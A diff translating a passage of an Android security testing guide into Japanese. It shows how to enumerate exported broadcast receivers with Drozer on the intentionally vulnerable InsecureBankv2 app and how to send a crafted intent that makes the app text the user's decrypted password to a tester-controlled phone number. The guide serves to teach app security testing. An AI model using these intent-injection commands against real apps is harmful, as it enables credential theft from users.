@@ -355,9 +355,9 @@ Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:
   Empty
 ```
 
-##### Broadcasts
+##### ブロードキャスト
 
-Broadcasts can be enumerated using the Drozer module `app.broadcast.info`, the target package should be specified using the `-a` parameter:
+ブロードキャストは Drozer モジュール `app.broadcast.info` を使用して列挙できます。ターゲットパッケージは `-a` パラメータを使用して指定する必要があります。
 
 ```
 dz> run app.broadcast.info -a com.android.insecurebankv2
@@ -366,9 +366,9 @@ Package: com.android.insecurebankv2
     Permission: null
 ```
 
-In the example app "Android Insecure Bank"<sup>2</sup>, we can see that one broadcast receiver is exported, not requiring any permissions, indicating that we can formulate an intent to trigger the broadcast receiver. When testing broadcast receivers, static analysis must also be used to understand the functionality of the broadcast receiver.
+例題アプリ "Android Insecure Bank" <sup>2</sup> では、ひとつのブロードキャストレシーバがエクスポートされており、パーミッションを必要とせず、ブロードキャストレシーバをトリガするインテントを記述できることを示しています。ブロードキャストレシーバをテストする際、静的解析を使用してブロードキャストレシーバの機能を理解する必要もあります。
 
-In the extract below taken from the source code of the target application, we can see that the broadcast receiver triggers a SMS message to be sent containing the decrypted password of the user.
+以下の抜粋は、ターゲットアプリケーションのソースコードから取得したもので、ブロードキャストレシーバが SMS メッセージをトリガし、復号されたユーザーのパスワードを含むものを送信することが分かります。
 
 ```
 public class MyBroadCastReceiver extends BroadcastReceiver {
@@ -398,13 +398,13 @@ public class MyBroadCastReceiver extends BroadcastReceiver {
 smsManager.sendTextMessage(textPhoneno, null, textMessage, null, null);
 ```
 
-Using the Drozer module `app.broadcast.send`, it is possible to formulate an intent to trigger the broadcast and send the password to a phone number within our control:
+Drozer モジュール `app.broadcast.send` を使用して、ブロードキャストをトリガするインテントを記述し、コントロール内の電話番号にパスワードを送信できます。
 
 ```
 dz>  run app.broadcast.send --action theBroadcast --extra string phonenumber 07123456789 --extra string newpass 12345
 ```
 
-This generates the following SMS:
+これにより以下の SMS が生成されます。
 
 ```
 Updated Password from: SecretPassword@ to: 12345
